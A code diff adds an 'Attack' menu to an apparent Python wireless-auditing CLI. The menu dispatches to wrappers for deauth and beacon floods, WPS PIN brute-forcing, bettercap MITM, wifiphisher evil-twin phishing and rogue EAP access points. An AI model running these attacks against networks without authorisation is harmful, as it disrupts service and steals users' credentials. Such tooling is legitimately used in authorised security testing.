@@ -8,7 +8,10 @@ from .config import load as load_cfg, save as save_cfg
 from .cracker import crack_handshake
 from .interface import list_interfaces, monitor_mode
 from .scanner import scan
-from .tools import deps, hashcat, hcxtools, john, kismet, nmap, packets, wireshark, wifite
+from .tools import (
+    deps, hashcat, hcxtools, john, kismet, nmap, packets, wireshark, wifite,
+    mdk4, aireplay, wps, bettercap, wifiphisher, hostapd_wpe, eaphammer,
+)
 from .utils import ToolError
 
 
@@ -201,6 +204,134 @@ def _packets_menu(cfg: dict) -> None:
             ui.pause()
 
 
+def _attack_menu(cfg: dict) -> None:
+    while True:
+        print(ui.header("Attack"))
+        print(ui.menu_item("1",  "Beacon flood (mdk4)"))
+        print(ui.menu_item("2",  "Deauth storm (mdk4, per-channel broadcast)"))
+        print(ui.menu_item("3",  "Auth DoS (mdk4)"))
+        print(ui.menu_item("4",  "EAPOL start flood (mdk4)"))
+        print(ui.menu_item("5",  "Deauth burst (aireplay-ng)"))
+        print(ui.menu_item("6",  "Fake auth (aireplay-ng)"))
+        print(ui.menu_item("7",  "ARP replay (aireplay-ng)"))
+        print(ui.menu_item("8",  "Injection test (aireplay-ng)"))
+        print(ui.menu_item("9",  "WPS scan (wash)"))
+        print(ui.menu_item("10", "WPS pixie-dust (reaver -K 1)"))
+        print(ui.menu_item("11", "WPS brute (reaver)"))
+        print(ui.menu_item("12", "WPS bully"))
+        print(ui.menu_item("13", "Bettercap MITM"))
+        print(ui.menu_item("14", "Evil twin / phishing (wifiphisher)"))
+        print(ui.menu_item("15", "Rogue EAP AP (hostapd-wpe)"))
+        print(ui.menu_item("16", "Hostile portal (eaphammer)"))
+        print(ui.menu_item("0",  "Back"))
+        c = ui.prompt()
+        if c == "0":
+            return
+        try:
+            if c == "1":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                ch_s = ui.field("channel (blank = hop all) >")
+                ch = int(ch_s) if ch_s else None
+                wpa = ui.field("advertise as WPA? [y/N] >").lower().startswith("y")
+                with monitor_mode(iface) as mon:
+                    mdk4.beacon_flood(mon, channel=ch, wpa=wpa)
+            elif c == "2":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                ch = int(ui.field("channel >"))
+                bssid = ui.field("target bssid >") or None
+                client = ui.field("client mac (blank = all) >") or None
+                with monitor_mode(iface) as mon:
+                    mdk4.deauth_storm(mon, ch, bssid=bssid, client=client)
+            elif c == "3":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                ch_s = ui.field("channel (blank = current) >")
+                ch = int(ch_s) if ch_s else None
+                with monitor_mode(iface) as mon:
+                    mdk4.auth_dos(mon, bssid, channel=ch)
+            elif c == "4":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                with monitor_mode(iface) as mon:
+                    mdk4.eapol_flood(mon, bssid)
+            elif c == "5":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                client = ui.field("client mac (blank = broadcast) >") or None
+                count = int(ui.field("packet count [50] >") or "50")
+                with monitor_mode(iface) as mon:
+                    aireplay.deauth(mon, bssid, client=client, count=count)
+            elif c == "6":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                essid = ui.field("target essid >")
+                bssid = ui.field("target bssid >")
+                my_mac = ui.field("your mac >")
+                count = int(ui.field("auth count [0 = forever] >") or "0")
+                with monitor_mode(iface) as mon:
+                    aireplay.fake_auth(mon, essid, bssid, my_mac, count=count)
+            elif c == "7":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                my_mac = ui.field("your mac >")
+                with monitor_mode(iface) as mon:
+                    aireplay.arp_replay(mon, bssid, my_mac)
+            elif c == "8":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                with monitor_mode(iface) as mon:
+                    aireplay.injection_test(mon)
+            elif c == "9":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                with monitor_mode(iface) as mon:
+                    print(wps.wash(mon, timeout=30))
+                ui.pause()
+            elif c == "10":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                ch_s = ui.field("channel (blank = auto) >")
+                ch = int(ch_s) if ch_s else None
+                with monitor_mode(iface) as mon:
+                    wps.reaver_pixie(mon, bssid, channel=ch)
+            elif c == "11":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                ch_s = ui.field("channel (blank = auto) >")
+                ch = int(ch_s) if ch_s else None
+                delay = int(ui.field("delay seconds [1] >") or "1")
+                pin = ui.field("known pin (blank for brute) >") or None
+                with monitor_mode(iface) as mon:
+                    wps.reaver_brute(mon, bssid, channel=ch, delay=delay, pin=pin)
+            elif c == "12":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                bssid = ui.field("target bssid >")
+                ch_s = ui.field("channel (blank = auto) >")
+                ch = int(ch_s) if ch_s else None
+                with monitor_mode(iface) as mon:
+                    wps.bully(mon, bssid, channel=ch)
+            elif c == "13":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                ui.warn("bettercap UI on http://127.0.0.1:80 — ctrl+c to stop")
+                bettercap.launch(iface)
+            elif c == "14":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                essid = ui.field("essid to clone (blank = pick) >") or None
+                page = ui.field("phishing pageset [firmware-upgrade] >") or "firmware-upgrade"
+                with monitor_mode(iface) as mon:
+                    wifiphisher.evil_twin(mon, essid=essid, phishing_page=page)
+            elif c == "15":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                essid = ui.field("rogue essid >")
+                ch = int(ui.field("channel [6] >") or "6")
+                hostapd_wpe.launch(iface, essid, channel=ch)
+            elif c == "16":
+                iface = ui.field(f"interface [{cfg['interface']}] >") or cfg["interface"]
+                essid = ui.field("rogue essid >")
+                ch = int(ui.field("channel [6] >") or "6")
+                eaphammer.hostile_portal(iface, essid, channel=ch)
+        except ToolError as e:
+            ui.err(str(e))
+            ui.pause()
+
+
 def main() -> None:
     cfg = load_cfg()
     actions = {
@@ -209,6 +340,7 @@ def main() -> None:
         "3": _audit_menu,
         "4": _password_menu,
         "5": _packets_menu,
+        "6": _attack_menu,
     }
     try:
         while True:
@@ -218,6 +350,7 @@ def main() -> None:
             print(ui.menu_item("3", "Audit"))
             print(ui.menu_item("4", "Password"))
             print(ui.menu_item("5", "Packets"))
+            print(ui.menu_item("6", "Attack"))
             print(ui.menu_item("0", "Exit"))
             print()
             choice = ui.prompt()
